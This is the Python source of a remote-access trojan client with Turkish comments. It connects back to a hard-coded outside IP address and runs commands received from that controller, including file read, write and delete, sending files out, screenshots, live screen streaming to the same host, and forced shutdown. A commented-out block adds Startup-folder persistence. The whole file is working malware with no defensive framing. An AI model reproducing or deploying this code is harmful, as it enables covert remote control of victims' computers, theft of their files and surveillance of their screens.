import socket
import os
import time
import pyautogui

host = "185.165.240.82"
port = 50000

#kalıcılık---------------------------------------------------------
"""
pyname = os.path.basename(__file__)
print(pyname)
executable = pyname.replace(".py",".exe")
print(executable)
os.system(f"copy {pyname} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\startup\" ")
"""
#kalıcılık---------------------------------------------------------
def main():

        #bağlantı----------------------------------------------------------
        while True:
            try:
                baglanti = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                baglanti.connect((host,port))
                break
            except Exception as e:
                print(f"HATA:{e}")
                time.sleep(5)
        #bağlantı----------------------------------------------------------
        
        while True:
            emir=baglanti.recv(16384).decode("utf-8")

            if emir == "shutdown":
                os.system("shutdown -s -t 3")
                response = "Kapatılıyor"
                
            elif emir.startswith("cd"):
                dizinimiz = emir.split()
                dizinimiz = dizinimiz[1]
                os.chdir(dizinimiz)
                response="dizin değiştirildi"
                
            elif emir.startswith("open"):
                acilacak_site = emir.split(" ", 1)
                acilacak_site = acilacak_site[1]
                os.startfile(acilacak_site)
                response="site açıldı"
                
            elif emir == "pwd":
                response = f"Dizin: {os.getcwd()}"
                
            elif emir.startswith("nano"):
                cmd = emir.split(" ", 2)
                file = cmd[1]
                text = cmd[2]
                with open(file, "w") as f:
                    f.write(text)
                response = f"{text}, {file} dosyasına kaydedildi."
                
            elif emir.startswith("cat"):
                file = emir.split(" ", 1)
                file = file[1]
                with open(file, "r") as f:
                    data = f.read()
                response = data
                
            elif emir.startswith("download"):
                downloadfile = emir.split(" ", 1)[1]
                with open(downloadfile, "rb") as f:
                    chunk = f.read(16384)
                    while chunk:
                        baglanti.send(chunk)
                        chunk = f.read(16384)
                    response=""
            
            elif emir.startswith("touch"):
                file = emir.split(" ", 1)
                file = file[1]
                with open(file, "w") as f:
                    f.write("")
                response = f"{file} dosyası oluşturuldu."
            
            elif emir.startswith("rm"):
                file = emir.split(" ", 1)
                file = file[1]
                os.remove(file)
                response = "Dosya silindi."
            
            elif emir == "ls":
                response = f"Dosyalar: {os.listdir()}"
                
            elif emir.startswith("screenshot"):
                try:
                    cmd = emir.split(" ", 1)
                    ssname = cmd[1]
                    path = ssname
                    ss = pyautogui.screenshot()
                    ss.save(path)
                    response = "SS alındı"
                                        
                except Exception as e:
                    response = e
                    print(e)
                
                
            elif emir == "kamera_ac":
                print("Kamera açılması için gerekli kodlar")
                response = "Kamera açıldı"
            
            elif emir == "screenshare":
                try:
                    from vidstream import ScreenShareClient
                    screen = ScreenShareClient(host, 9090)
                    screen.start_stream()
                    response = "Bağlantı başarılı."
                except Exception as e:
                    print(e)
                    response = e
                
            
            elif emir == "stop_screenshare":
                try:
                    screen.stop_stream()
                    response = "Yayın durduruldu."
                except Exception as e:
                    print(e)
            
            else:
                response = "GEÇERSİZ EMİR"
                
            baglanti.send(response.encode("utf-8"))
        


if __name__ == "__main__":
    try:
        main()
    except:
        time.sleep(5)
        main()